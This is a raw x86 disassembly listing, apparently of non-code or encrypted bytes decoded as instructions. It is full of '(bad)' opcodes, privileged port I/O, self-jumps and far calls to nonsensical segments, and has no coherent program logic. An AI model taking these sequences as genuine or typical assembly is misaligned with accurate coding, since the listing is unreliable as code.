  41ede0:	inc    esi
  41ede1:	and    eax,0x3cbcf6
  41ede6:	pop    eax
  41ede7:	cmp    al,0x9a
  41ede9:	and    eax,DWORD PTR [esi+esi*1-0xe]
  41eded:	(bad)  
  41edee:	imul   ebx,DWORD PTR [ebp+0x7b],0x1a
  41edf2:	lods   al,BYTE PTR ds:[esi]
  41edf3:	lods   al,BYTE PTR ds:[esi]
  41edf4:	adc    BYTE PTR [eax+0x7da17aee],dh
  41edfa:	and    BYTE PTR [eax-0x6f508c96],cl
  41ee00:	or     ebx,DWORD PTR [ebp+0x6f]
  41ee03:	mov    ah,BYTE PTR [edi+esi*2]
  41ee06:	sbb    al,al
  41ee08:	call   0x48e1:0x23c9a2e3
  41ee0f:	xchg   edi,eax
  41ee10:	lods   eax,DWORD PTR ds:[esi]
  41ee11:	jp     0x41ed9c
  41ee13:	push   edx
  41ee14:	(bad)  
  41ee15:	clc    
  41ee16:	(bad)  
  41ee17:	push   esi
  41ee18:	cld    
  41ee19:	int3   
  41ee1a:	push   ebp
  41ee1b:	daa    
  41ee1c:	jmp    0x41ee1c
  41ee1e:	dec    eax
  41ee1f:	fwait
  41ee20:	pushf  
  41ee21:	push   ss
  41ee22:	xchg   ebp,eax
  41ee23:	pop    ss
  41ee24:	and    al,BYTE PTR [eax]
  41ee26:	push   esp
  41ee27:	jne    0x41ee48
  41ee29:	inc    ebx
  41ee2a:	mov    cl,0xef
  41ee2c:	fadd   DWORD PTR ds:0xaf29bc8b
  41ee32:	ja     0x41ee71
  41ee34:	call   0xe33:0xd8a05ee6
  41ee3b:	and    BYTE PTR [ebp+0x21],bh
  41ee3e:	imul   eax,DWORD PTR [ebx-0x10],0xfffffffd
  41ee42:	mov    bl,0xe3
  41ee44:	call   0xe8f02f6b
  41ee49:	mov    esp,0xa3286453
  41ee4e:	and    BYTE PTR [edi-0x45d64409],bl
  41ee54:	adc    eax,0x59c17044
  41ee59:	sub    BYTE PTR [esi],bl
  41ee5b:	in     eax,dx
  41ee5c:	out    dx,eax
  41ee5d:	inc    edi
  41ee5e:	xor    BYTE PTR [edx+0x74],al
  41ee61:	add    ch,dh
  41ee63:	dec    esi
  41ee64:	inc    edx
  41ee65:	mov    ds:0xacbb5774,eax
  41ee6a:	sbb    DWORD PTR [ebx-0x76],edx
  41ee6d:	inc    eax
  41ee6e:	and    eax,0x4a392373
  41ee73:	shl    DWORD PTR [ecx+0x6a12b6f6],cl
  41ee79:	pop    ss
  41ee7a:	lea    ecx,[ebp-0x3d61e22c]
  41ee80:	repz mov ds:0x1d0e0e57,eax
  41ee86:	out    0x66,eax
  41ee88:	fdivrp st(4),st
  41ee8a:	inc    ecx
  41ee8b:	stc    
  41ee8c:	or     eax,0xb1de9aac
  41ee91:	mov    ch,0x8c
  41ee93:	or     eax,0xb4ef5988
  41ee98:	mov    dh,0x73
  41ee9a:	mov    esi,0xbc06664
  41ee9f:	loopne 0x41ee57
  41eea1:	out    0xaf,eax
  41eea3:	xchg   ebp,eax
  41eea4:	xor    DWORD PTR [eax-0x5d],esp
  41eea7:	or     al,0x52
  41eea9:	fs stc 
  41eeab:	mov    esp,0x5d8f4cb6
  41eeb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeb1:	test   ch,bl
  41eeb3:	outs   dx,BYTE PTR ds:[esi]
  41eeb4:	ret    0xe05d
  41eeb7:	mov    ebx,0x1fbfbdbf
  41eebc:	dec    eax
  41eebd:	leave  
  41eebe:	fdivr  QWORD PTR [eax+0x22cbb600]
  41eec4:	jg     0x41ef2d
  41eec6:	xchg   DWORD PTR [ecx],edi
  41eec8:	jg     0x41ef16
  41eeca:	ret    
  41eecb:	dec    edx
  41eecc:	mov    ecx,0xd25c97e
  41eed1:	mov    ?,WORD PTR [eax]
  41eed3:	pop    ebx
  41eed4:	mov    al,0xee
  41eed6:	mov    al,ds:0x43887110
  41eedb:	out    dx,al
  41eedc:	inc    eax
  41eedd:	aas    
  41eede:	sub    DWORD PTR [ebp-0x444b12c8],edx
  41eee4:	test   al,0x6f
  41eee6:	retf   
  41eee7:	sahf   
  41eee8:	sbb    eax,ebp
  41eeea:	(bad)  
  41eeeb:	gs arpl dx,sp
  41eeee:	mov    ecx,0xc8f748ae
  41eef3:	popf   
  41eef4:	inc    esp
  41eef5:	sti    
  41eef6:	imul   esp,DWORD PTR [edi],0x891d1f06
  41eefc:	mov    dh,0x7b
  41eefe:	(bad)
  41ef01:	les    esp,FWORD PTR ds:0x1a9a6d3c
  41ef07:	loopne 0x41ef06
  41ef09:	jnp    0x41ef30
  41ef0b:	mov    bh,0x1e
  41ef0d:	mov    eax,ds:0x60280899
  41ef12:	push   esp
  41ef13:	(bad)  
  41ef15:	into   
  41ef16:	bound  ebp,QWORD PTR [ecx-0x39e63d34]
  41ef1c:	sub    edi,DWORD PTR [eax]
  41ef1e:	sbb    al,BYTE PTR [ecx]
  41ef20:	jge    0x41ef63
  41ef22:	cwde   
  41ef23:	test   ch,ah
  41ef25:	jns    0x41ef3b
  41ef27:	xchg   esp,eax
  41ef28:	test   al,0xad
  41ef2a:	push   edx
  41ef2b:	aas    
  41ef2c:	xchg   DWORD PTR [edx],ebx
  41ef2e:	out    0x30,al
  41ef30:	sub    dl,BYTE PTR [ebp-0x4b]
  41ef33:	jnp    0x41ef6c
  41ef35:	dec    edi
  41ef36:	dec    ebx
  41ef37:	xor    al,0xe2
  41ef39:	in     al,dx
  41ef3a:	pop    ss
  41ef3b:	stos   BYTE PTR es:[edi],al
  41ef3c:	sbb    edx,DWORD PTR [edx+0x78]
  41ef3f:	add    al,0xb8
  41ef41:	test   DWORD PTR ds:0xb401c473,0xf3274ef7
  41ef4b:	jecxz  0x41eeed
  41ef4d:	dec    esp
  41ef4e:	enter  0x6713,0xf8
  41ef52:	pop    edx
  41ef53:	lock push es
  41ef55:	push   edi
  41ef56:	shl    DWORD PTR [eax],1
  41ef58:	ret    0x323d
  41ef5b:	lods   eax,DWORD PTR ds:[esi]
  41ef5c:	sub    DWORD PTR [eax],0x2c9c1234
  41ef62:	mov    dh,0x7d
  41ef64:	hlt    
  41ef65:	enter  0x5d58,0xde
  41ef69:	mov    ds:0xd47db2ea,eax
  41ef6e:	mov    ah,0x5c
  41ef70:	sub    al,0xd0
  41ef72:	adc    ch,al
  41ef74:	(bad)  
  41ef78:	pop    es
  41ef79:	test   bl,bh
  41ef7b:	jge    0x41ef00
  41ef7d:	xchg   ecx,eax
  41ef7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef7f:	jbe    0x41ef19
  41ef81:	(bad)  
  41ef82:	loop   0x41ef9c
  41ef84:	js     0x41efab
  41ef86:	xchg   esp,eax
  41ef87:	imul   edx,ebx,0x8aca4efd
  41ef8d:	leave  
  41ef8e:	popf   
  41ef8f:	or     DWORD PTR ds:0xe88dfb97,esi
  41ef95:	call   0x7672aa15
  41ef9a:	repnz loope 0x41eff8
  41ef9d:	test   al,0x74
  41ef9f:	jge    0x41ef2c
  41efa1:	outs   dx,BYTE PTR ds:[esi]
  41efa2:	dec    esp
  41efa3:	or     eax,0xa23e8b45
  41efa8:	jae    0x41ef79
  41efaa:	and    DWORD PTR [eax+0x6dcd5f87],eax
  41efb0:	add    al,BYTE PTR [si+0x2e]
  41efb4:	call   0xfb6f1927
  41efb9:	fcmovne st,st(2)
  41efbb:	mov    ah,BYTE PTR [ecx-0x12]
  41efbe:	mov    BYTE PTR [ecx+0x8],0x48
  41efc2:	(bad)
  41efc5:	ja     0x41efae
  41efc7:	out    0x86,eax
  41efc9:	and    BYTE PTR [esi],bh
  41efcb:	pop    esp
  41efcc:	data16 or al,0xf7
  41efcf:	push   cs
  41efd0:	nop
  41efd1:	adc    cl,BYTE PTR [edi-0x7a5e1787]
  41efd7:	xor    eax,0xdf6e0e4a
  41efdc:	fs or  cl,dl
  41efdf:	mov    BYTE PTR [edi],0x60
  41efe2:	xchg   bl,ch
  41efe4:	aad    0x1d
  41efe6:	inc    eax
  41efe7:	cs push ecx
  41efe9:	rol    BYTE PTR cs:[ebx-0x2ecd41c9],0x49
  41eff1:	push   ecx
  41eff2:	out    dx,eax
  41eff3:	test   BYTE PTR [edi-0x69],cl
  41eff6:	and    cl,bh
  41eff8:	int3   
  41eff9:	cmc    
  41effa:	iret   
  41effb:	xor    eax,0xaf5a6e3b
  41f000:	or     edx,ecx
  41f002:	mov    eax,0x58f3866f
  41f007:	jnp    0x41efaf
  41f009:	mov    dh,0xb
  41f00b:	(bad)  
  41f00c:	mov    eax,0xdaf58672
  41f011:	ss jno 0x41efef
  41f014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f015:	xchg   ebp,eax
  41f016:	add    edi,ebx
  41f018:	and    eax,DWORD PTR [edi-0x11]
  41f01b:	aaa    
  41f01c:	sub    eax,0xf80cc299
  41f021:	pop    ebx
  41f022:	aaa    
  41f023:	leave  
  41f024:	jnp    0x41eff0
  41f026:	pop    esi
  41f027:	mov    esi,0x251f7674
  41f02c:	fld    DWORD PTR [eax+edx*1]
  41f02f:	push   ebx
  41f030:	sahf   
  41f031:	icebp  
  41f032:	adc    al,0xc7
  41f034:	pop    esi
  41f035:	xchg   esp,eax
  41f036:	adc    dh,ch
  41f038:	jge    0x41f09f
  41f03a:	or     BYTE PTR [ebx+0x57b5757e],0x68
  41f041:	gs lock fdivp st(1),st
  41f045:	adc    DWORD PTR [ebx],ecx
  41f047:	dec    esp
  41f048:	mov    ds:0xc5443f57,al
  41f04d:	sbb    DWORD PTR [eax+0x5e],eax
  41f050:	das    
  41f051:	mov    dh,0x30
  41f053:	lds    ebp,FWORD PTR [eax+0x54]
  41f056:	mov    al,ds:0x54923ba8
  41f05b:	inc    esp
  41f05c:	lods   eax,DWORD PTR ds:[esi]
  41f05d:	cmp    al,0xa5
  41f05f:	lahf   
  41f060:	inc    BYTE PTR [esi+esi*1]
  41f063:	push   edx
  41f064:	aam    0x52
  41f066:	push   esp
  41f067:	mov    BYTE PTR [esi+ebp*2+0x6e],dh
  41f06b:	and    esp,DWORD PTR [edx+0x3440680f]
  41f071:	fsubr  st,st(4)
  41f073:	aad    0x87
  41f075:	or     al,0x6
  41f077:	call   0x4b28:0x753aef1f
  41f07e:	idiv   DWORD PTR [edx-0x47]
  41f081:	leave  
  41f082:	iret   
  41f083:	jmp    0x37c:0xef695eff
  41f08a:	stos   BYTE PTR es:[edi],al
  41f08b:	dec    ebp
  41f08c:	jbe    0x41f053
  41f08e:	mov    eax,0x782cc24a
  41f093:	xor    al,0x48
  41f095:	aam    0x7d
  41f097:	inc    ecx
  41f098:	mov    DWORD PTR [ebp+0x68],eax
  41f09b:	arpl   WORD PTR [ebp+0x18],bx
  41f09e:	arpl   WORD PTR ds:[edi-0x7f],bp
  41f0a2:	gs jge 0x41f0cf
  41f0a5:	je     0x41f08a
  41f0a7:	fadd   QWORD PTR [ebx]
  41f0a9:	cmp    DWORD PTR [edi],esi
  41f0ab:	adc    edi,DWORD PTR ds:0xf03a7e2b
  41f0b1:	mov    ecx,0x5f7253f9
  41f0b6:	adc    al,dh
  41f0b8:	jmp    0x80384a3
  41f0bd:	push   ecx
  41f0be:	adc    esp,DWORD PTR [ebx]
  41f0c0:	mov    ds:0x57fcb22c,eax
  41f0c5:	or     bh,BYTE PTR [eax*4-0x5dc9ee69]
  41f0cc:	outs   dx,BYTE PTR ds:[esi]
  41f0cd:	out    dx,al
  41f0ce:	call   0x9f88:0x4c85fcb2
  41f0d5:	jbe    0x41f111
  41f0d7:	(bad)  
  41f0d8:	(bad)  
  41f0d9:	std    
  41f0da:	or     ch,BYTE PTR [ecx]
  41f0dc:	sbb    ecx,DWORD PTR [ebx+0x51]
  41f0df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0e0:	shr    BYTE PTR [esp+edi*2-0x2d],0xfc
  41f0e5:	mov    dh,bl
  41f0e7:	xor    esp,edi
  41f0e9:	neg    esi
  41f0eb:	loop   0x41f0d7
  41f0ed:	jne    0x41f114
  41f0ef:	iret   
  41f0f0:	dec    esp
  41f0f1:	out    dx,al
  41f0f2:	nop
  41f0f3:	xor    esp,edx
  41f0f5:	dec    ebx
  41f0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0f7:	cli    
  41f0f8:	(bad)  fs:[ebp-0x3e]
  41f0fc:	or     cl,BYTE PTR [ebx+0x6d57827d]
  41f102:	adc    eax,0x2ea6c61d
  41f107:	pushf  
  41f108:	cdq    
  41f109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f10a:	mov    bl,0xbe
  41f10c:	jno    0x41f0be
  41f10e:	sbb    BYTE PTR [ebx+0x260a3488],bl
  41f114:	mov    al,0xda
  41f116:	ss inc eax
  41f118:	scas   al,BYTE PTR es:[edi]
  41f119:	xor    eax,0xc4504c46
  41f11e:	mov    al,0xb2
  41f120:	js     0x41f0f3
  41f122:	mov    ch,BYTE PTR [ebp-0x72713a27]
  41f128:	shr    DWORD PTR [esi-0x35],cl
  41f12b:	sub    bl,BYTE PTR [ecx]
  41f12d:	cld    
  41f12e:	push   ebx
  41f12f:	lods   eax,DWORD PTR ds:[esi]
  41f130:	or     ebp,ecx
  41f132:	cmp    ah,BYTE PTR [eax]
  41f134:	ds xchg esi,eax
  41f136:	xchg   esp,eax
  41f137:	pushf  
  41f138:	data16 mov BYTE PTR [ebp+ecx*2-0x41],al
  41f13d:	ret    
  41f13e:	mov    ds:0x4151fcc8,eax
  41f143:	and    BYTE PTR [eax+0xa0ac999],ah
  41f149:	mov    ds:0x350d7128,al
  41f14e:	or     eax,ebp
  41f150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f151:	pop    edi
  41f152:	add    al,0xe6
  41f154:	enter  0xa2b2,0xde
  41f158:	gs push ss
  41f15a:	dec    eax
  41f15b:	or     eax,0x44b2ff4b
  41f160:	scas   al,BYTE PTR es:[edi]
  41f161:	mov    esp,0x1fc70e6e
  41f166:	mov    edi,0x96095980
  41f16b:	sbb    al,0x5c
  41f16d:	iret   
  41f16e:	push   edx
  41f16f:	pop    ebp
  41f170:	cmp    dl,cl
  41f172:	mov    bh,0x52
  41f174:	mov    ebp,0xff3f8a8f
  41f179:	or     ah,BYTE PTR [edi]
  41f17b:	adc    eax,0xcc61c498
  41f180:	fcom   st(1)
  41f182:	shr    edi,1
  41f184:	je     0x41f1a4
  41f186:	out    dx,al
  41f187:	std    
  41f188:	inc    esi
  41f189:	and    al,0x55
  41f18b:	adc    BYTE PTR [ecx],al
  41f18d:	mov    dh,BYTE PTR cs:[eax-0x360f6e25]
  41f194:	xor    BYTE PTR [esi],dh
  41f196:	outs   dx,BYTE PTR ds:[esi]
  41f197:	jae    0x41f122
  41f199:	jns    0x41f188
  41f19b:	shr    BYTE PTR [edx+0x3c53cc62],cl
  41f1a1:	dec    edi
  41f1a2:	lods   eax,DWORD PTR ds:[esi]
  41f1a3:	repz mov ds:0xb70605e1,eax
  41f1a9:	(bad)  
  41f1aa:	jb     0x41f1a7
  41f1ac:	lock fist WORD PTR [ebp-0x73]
  41f1b0:	into   
  41f1b1:	jle    0x41f1d8
  41f1b3:	fmul   st,st(7)
  41f1b5:	out    0xf,eax
  41f1b7:	jecxz  0x41f162
  41f1b9:	cmp    al,0x4
  41f1bb:	inc    eax
  41f1bc:	cmp    ch,ah
  41f1be:	pop    ss
  41f1bf:	das    
  41f1c0:	adc    eax,0x6d2f1f5d
  41f1c5:	mov    BYTE PTR [eax+0x270fc1f5],al
  41f1cb:	xchg   BYTE PTR ds:0x6b1a9d79,al
  41f1d1:	(bad)  
  41f1d2:	jl     0x41f186
  41f1d4:	sbb    DWORD PTR [esp+ecx*4-0x3bd60eb1],0xffffffbc
  41f1dc:	(bad)  
  41f1dd:	push   cs
  41f1de:	xchg   DWORD PTR [edi+0xc],edx
  41f1e1:	jno    0x41f1fe
  41f1e3:	rcr    BYTE PTR fs:[edx+eiz*4-0x9],0x1a
  41f1e9:	test   eax,0x9a040674
  41f1ee:	jno    0x41f1bb
  41f1f0:	aaa    
  41f1f1:	pop    es
  41f1f2:	push   eax
  41f1f3:	adc    DWORD PTR [edx-0xeca2cd6],0x7
  41f1fa:	out    0xbd,al
  41f1fc:	xor    al,0x9a
  41f1fe:	inc    ebx
  41f1ff:	inc    esi
  41f200:	dec    edi
  41f201:	mov    dh,0x24
  41f203:	push   ebx
  41f204:	sub    BYTE PTR [ecx-0x4e],0xac
  41f208:	fwait
  41f209:	loopne 0x41f273
  41f20b:	pop    edx
  41f20c:	(bad)  
  41f20d:	mov    ds:0x13aa0a92,eax
  41f212:	je     0x41f199
  41f214:	repz cmp BYTE PTR [esi],dh
  41f217:	mov    esi,0x3b467d3
  41f21c:	xor    ebx,DWORD PTR [esi-0x24638830]
  41f222:	int    0x9e
  41f224:	es add ebp,ebx
  41f227:	inc    esi
  41f228:	mov    bl,0x75
  41f22a:	xchg   ebp,eax
  41f22b:	jmp    0x41f271
  41f22d:	in     al,0x47
  41f22f:	bnd jo 0x41f274
  41f232:	retf   0x30ef
  41f235:	push   ebp
  41f236:	mov    ebx,0x69355246
  41f23b:	mov    BYTE PTR [edi+ebp*4-0x127a44e1],bh
  41f242:	or     esp,DWORD PTR [edx]
  41f244:	dec    edx
  41f245:	jle    0x41f252
  41f247:	push   esi
  41f248:	test   bh,bl
  41f24a:	shl    DWORD PTR [edi-0xa9d541b],1
  41f250:	daa    
  41f251:	adc    al,0xe5
  41f253:	nop
  41f254:	xor    eax,0xb140975f
  41f259:	add    eax,0xc83114a0
  41f25e:	xchg   ebp,eax
  41f25f:	pop    eax
  41f260:	mov    bl,0xfc
  41f262:	xchg   edi,eax
  41f263:	cwde   
  41f264:	mov    ah,BYTE PTR [eax+0x3f]
  41f267:	fist   DWORD PTR [eax+0x5a395d1a]
  41f26d:	fisttp QWORD PTR [esi-0x52]
  41f270:	sbb    eax,0xf8fb5d35
  41f275:	jns    0x41f2a0
  41f277:	into   
  41f278:	pop    edx
  41f279:	jmp    0x41f2eb
  41f27b:	int3   
  41f27c:	adc    al,0xd6
  41f27e:	popf   
  41f27f:	inc    ecx
  41f280:	jp     0x41f27f
  41f282:	inc    eax
  41f283:	fnstenv ds:0xd869014e
  41f289:	inc    ebx
  41f28a:	dec    ecx
  41f28b:	push   edx
  41f28c:	sbb    esi,esp
  41f28e:	mov    ah,0x74
  41f290:	in     eax,dx
  41f291:	adc    ebx,DWORD PTR [ebp-0x73]
  41f294:	call   0x8a2d:0xf9cf737e
  41f29b:	push   esi
  41f29c:	add    dl,BYTE PTR [esp]
  41f29f:	loop   0x41f240
  41f2a1:	ret    
  41f2a2:	lods   eax,DWORD PTR ds:[esi]
  41f2a3:	fwait
  41f2a4:	repnz outs dx,BYTE PTR ds:[esi]
  41f2a6:	int3   
  41f2a7:	(bad)  
  41f2a8:	pop    ebp
  41f2a9:	mov    ah,cl
  41f2ab:	call   0x9ddd:0xc7f67a43
  41f2b2:	and    eax,0x65dbbb7
  41f2b7:	add    ebx,edi
  41f2b9:	xor    DWORD PTR [edx+edx*4+0x4c9d203e],edi
  41f2c0:	ins    BYTE PTR es:[edi],dx
  41f2c1:	mov    bl,0xa5
  41f2c3:	xchg   esp,eax
  41f2c4:	dec    edi
  41f2c5:	std    
  41f2c6:	fld    QWORD PTR [ebx]
  41f2c8:	mov    bh,0x40
  41f2ca:	push   es
  41f2cb:	jae    0x41f308
  41f2cd:	xor    al,0x6a
  41f2cf:	jnp    0x41f259
  41f2d1:	xchg   esi,eax
  41f2d2:	sbb    al,ah
  41f2d4:	daa    
  41f2d5:	(bad)  
  41f2d6:	jmp    0x41f2d2
  41f2d8:	sbb    BYTE PTR [edi+edi*8+0x23f9c317],al
  41f2df:	xor    BYTE PTR [esi-0x22ef5168],al
  41f2e5:	dec    esi
  41f2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2e7:	jnp    0x41f361
  41f2e9:	mov    ds:0x95ba0167,eax
  41f2ee:	(bad)  
  41f2ef:	xor    al,0x27
  41f2f1:	pop    ecx
  41f2f2:	mov    eax,0xdd1867bc
  41f2f7:	pop    esi
  41f2f8:	popa   
  41f2f9:	jne    0x41f372
  41f2fb:	stos   BYTE PTR es:[edi],al
  41f2fc:	mov    fs,WORD PTR [eax+esi*8+0xe]
  41f300:	cld    
  41f301:	sub    al,0x52
  41f303:	or     BYTE PTR [ebp+0x13],al
  41f306:	mov    BYTE PTR [edx-0x14],0x47
  41f30a:	(bad)  
  41f30b:	data16 stos BYTE PTR es:[edi],al
  41f30d:	fidivr DWORD PTR [ebp+0x76]
  41f310:	mov    al,0xf8
  41f312:	aas    
  41f313:	scas   eax,DWORD PTR es:[edi]
  41f314:	je     0x41f2b7
  41f316:	test   eax,0x253e601f
  41f31b:	xchg   BYTE PTR [eax+0x63],ch
  41f31e:	pop    esi
  41f31f:	sub    edi,esp
  41f321:	or     eax,0xa62ef6d2
  41f326:	sbb    eax,eax
  41f328:	dec    esp
  41f329:	or     esi,0x7e
  41f32c:	adc    eax,0x9364133
  41f331:	add    edx,edx
  41f333:	mov    al,0xd6
  41f335:	aas    
  41f336:	mov    BYTE PTR ds:0xb60eb238,al
  41f33c:	xor    esi,DWORD PTR es:[ecx+0x30]
  41f340:	mov    esi,0x33cd34b0
  41f345:	test   DWORD PTR ds:0xba4227cc,edx
  41f34b:	pop    es
  41f34c:	push   edi
  41f34d:	xchg   ecx,eax
  41f34e:	sub    BYTE PTR [esi+esi*8+0x29a990af],al
  41f355:	test   BYTE PTR [edi],0x3c
  41f358:	jb     0x41f2df
  41f35a:	pop    eax
  41f35b:	cwde   
  41f35c:	(bad)  
  41f35d:	fs repnz cwde 
  41f360:	cmc    
  41f361:	test   eax,0x72ac1bba
  41f366:	popf   
  41f367:	aas    
  41f368:	or     bl,bh
  41f36a:	push   esi
  41f36b:	ror    BYTE PTR [ecx+0x63],cl
  41f36e:	imul   esi,DWORD PTR [edx+ecx*8-0x8],0x60
  41f373:	push   ss
  41f374:	or     eax,DWORD PTR ss:[edx+ecx*1+0x676d0bd3]
  41f37c:	push   ecx
  41f37d:	imul   eax,DWORD PTR ds:0xef30bda0,0xffffffc2
  41f385:	in     al,dx
  41f386:	out    dx,eax
  41f387:	mov    ds:0xf44df2b7,al
  41f38c:	das    
  41f38d:	clc    
  41f38e:	rcl    BYTE PTR [edx],1
  41f390:	push   ebp
  41f391:	shr    DWORD PTR ds:0x4006e51d,0xa5
  41f398:	mov    dl,0x3e
  41f39a:	push   ecx
  41f39b:	adc    al,0x16
  41f39d:	es push 0xbb40f65f
  41f3a3:	mov    dh,0x9c
  41f3a5:	icebp  
  41f3a6:	xlat   BYTE PTR ds:[ebx]
  41f3a7:	push   0x1
  41f3a9:	xchg   ebx,eax
  41f3aa:	mov    ecx,0x970f5696
  41f3af:	mov    ax,ds:0xa88b703e
  41f3b5:	jns    0x41f413
  41f3b7:	lods   al,BYTE PTR ds:[esi]
  41f3b8:	adc    esi,DWORD PTR [edi]
  41f3ba:	int3   
  41f3bb:	addps  xmm4,XMMWORD PTR [ecx+0x6232fc0d]
  41f3c2:	push   eax
  41f3c3:	hlt    
  41f3c4:	xchg   ebp,eax
  41f3c5:	jnp    0x41f404
  41f3c7:	mov    al,ds:0x6ddfe507
  41f3cc:	xchg   esi,eax
  41f3cd:	xor    ebp,DWORD PTR [ecx+0x34]
  41f3d0:	dec    eax
  41f3d1:	dec    eax
  41f3d2:	or     ebp,DWORD PTR [edi+0x6b]
  41f3d5:	jbe    0x41f383
  41f3d7:	mov    esi,0x21a8ffb5
  41f3dc:	mov    ebp,0x13c80fe2
  41f3e1:	lods   al,BYTE PTR ds:[esi]
  41f3e2:	(bad)  
  41f3e3:	rcl    DWORD PTR ds:0x3d0cab69,cl
  41f3e9:	push   esi
  41f3ea:	jle    0x41f43f
  41f3ec:	ret    0x5cfc
  41f3ef:	pop    es
  41f3f0:	test   eax,0x9dc8469
  41f3f5:	ja     0x41f3be
  41f3f7:	jb     0x41f474
  41f3f9:	pop    es
  41f3fa:	inc    ebx
  41f3fb:	pushf  
  41f3fc:	add    cl,bl
  41f3fe:	xchg   esi,eax
  41f3ff:	cmp    al,0x44
  41f401:	cmc    
  41f402:	fist   DWORD PTR [edx]
  41f404:	jecxz  0x41f449
  41f406:	add    BYTE PTR [ebx],ah
  41f408:	repnz pop esi
  41f40a:	nop
  41f40b:	mov    eax,0x2f04045a
  41f410:	scas   eax,DWORD PTR es:[edi]
  41f411:	mov    ch,0x69
  41f413:	add    DWORD PTR [ebp+0x1f],edx
  41f416:	(bad)  
  41f417:	not    BYTE PTR [eax-0x5d763eb2]
  41f41d:	pop    edx
  41f41e:	repnz test al,0x82
  41f421:	mov    ds:0x86873e5f,eax
  41f426:	jo     0x41f43b
  41f428:	xchg   ebp,eax
  41f429:	jecxz  0x41f462
  41f42b:	arpl   WORD PTR [esp+ebx*2],dx
  41f42e:	adc    BYTE PTR [edi+edx*1],al
  41f431:	test   eax,0xef7b662f
  41f436:	pushf  
  41f437:	inc    esi
  41f438:	addr16 in al,0xff
  41f43b:	out    dx,al
  41f43c:	shr    DWORD PTR [ebp-0x7da9d2d0],cl
  41f442:	(bad)  
  41f443:	push   ecx
  41f444:	inc    eax
  41f445:	jns    0x41f43b
  41f447:	mul    BYTE PTR [esi+0x3]
  41f44a:	and    ebp,DWORD PTR [esi+0x36]
  41f44d:	scas   eax,DWORD PTR es:[edi]
  41f44e:	fs sub eax,0x7e967b4e
  41f454:	lea    ebp,[edx+edx*1-0x5d]
  41f458:	ret    0x95f8
  41f45b:	sbb    al,0x30
  41f45d:	retf   
  41f45e:	mov    eax,ds:0x7b722a6c
  41f463:	sbb    ah,BYTE PTR [eax]
  41f465:	cmc    
  41f466:	xlat   BYTE PTR ds:[ebx]
  41f467:	imul   BYTE PTR [ebx-0x6d]
  41f46a:	ins    BYTE PTR es:[edi],dx
  41f46b:	aaa    
  41f46c:	or     eax,0x8dedeca3
  41f471:	call   0x492f6c
  41f476:	mov    dl,0xfa
  41f478:	sbb    esp,esp
  41f47a:	add    eax,0x9c407bb3
  41f47f:	or     esi,ebx
  41f481:	(bad)  
  41f482:	call   0x8e29be15
  41f487:	sub    DWORD PTR [eax+0x60],ebp
  41f48a:	leave  
  41f48b:	clc    
  41f48c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f48d:	add    al,BYTE PTR cs:[esi-0x66]
  41f491:	inc    DWORD PTR [ebx+0x69]
  41f494:	in     eax,dx
  41f495:	fs pop ebx
  41f497:	in     al,0xd1
  41f499:	test   BYTE PTR [ecx-0x42248493],0x52
  41f4a0:	in     eax,dx
  41f4a1:	aas    
  41f4a2:	or     dh,BYTE PTR [ebp+ebp*1+0x59ea5859]
  41f4a9:	xchg   ecx,eax
  41f4aa:	jle    0x41f469
  41f4ac:	scas   al,BYTE PTR es:[edi]
  41f4ad:	rol    BYTE PTR [eax+0x40],0x4f
  41f4b1:	push   esi
  41f4b2:	xchg   ebp,eax
  41f4b3:	je     0x41f4a7
  41f4b5:	stos   BYTE PTR es:[edi],al
  41f4b6:	mov    esi,0x57a211d4
  41f4bb:	and    bl,BYTE PTR [eax]
  41f4bd:	jbe    0x41f4b0
  41f4bf:	xchg   ebx,eax
  41f4c0:	hlt    
  41f4c1:	jge    0x41f524
  41f4c3:	scas   eax,DWORD PTR es:[edi]
  41f4c4:	mov    esi,edx
  41f4c6:	std    
  41f4c7:	sbb    bh,al
  41f4c9:	call   0xa452eb87
  41f4ce:	jecxz  0x41f48d
  41f4d0:	and    cl,BYTE PTR [eax+esi*8-0x3679130]
  41f4d7:	xchg   esi,eax
  41f4d8:	mov    ecx,0x7ea794fe
  41f4dd:	aad    0xd1
  41f4df:	jg     0x41f552
  41f4e1:	mov    ebp,0xf67b8c06
  41f4e6:	mov    ebx,0xd077cd1e
  41f4eb:	push   es
  41f4ec:	cmp    BYTE PTR [edx],ch
  41f4ee:	mov    edi,0x42268642
  41f4f3:	js     0x41f531
  41f4f5:	ficom  WORD PTR [ebx+0x33]
  41f4f8:	std    
  41f4f9:	cs dec ebp
  41f4fb:	jg     0x41f509
  41f4fd:	xor    eax,0x901e81d7
  41f502:	clc    
  41f503:	fisubr DWORD PTR [ebp-0xb]
  41f506:	mov    esi,DWORD PTR [eax-0x67]
  41f509:	fcom   QWORD PTR [ebp+0x42]
  41f50c:	mov    al,ds:0x1c7b8e97
  41f511:	push   ebp
  41f512:	jmp    0x41f4c2
  41f514:	(bad)  
  41f515:	mov    edi,0xa6269c37
  41f51a:	or     eax,0xbfe47af
  41f51f:	test   DWORD PTR [esi],0xd52939a6
  41f525:	cmp    BYTE PTR [edi-0x59],0xcb
  41f529:	add    dh,ch
  41f52b:	fwait
  41f52c:	and    ebx,0xfffffffa
  41f52f:	and    al,0x33
  41f531:	lods   eax,DWORD PTR ds:[esi]
  41f532:	iret   
  41f533:	push   edi
  41f534:	popa   
  41f535:	nop
  41f536:	pop    ebp
  41f537:	jno    0x41f4f8
  41f539:	(bad)  
  41f53a:	pop    eax
  41f53b:	mov    esp,0x38d3b043
  41f540:	(bad)  
  41f541:	fadd   DWORD PTR [edx+esi*1]
  41f544:	test   eax,0xc16e15b2
  41f549:	cmp    al,0xbf
  41f54b:	repz sbb al,0x47
  41f54e:	jb     0x41f570
  41f550:	cwde   
  41f551:	fs jb  0x41f597
  41f554:	or     BYTE PTR ds:0xfc818d34,bl
  41f55a:	iret   
  41f55b:	sbb    bh,BYTE PTR [ebx+0x77c1b0ed]
  41f561:	sbb    al,BYTE PTR [ecx-0x45]
  41f564:	xchg   cl,dl
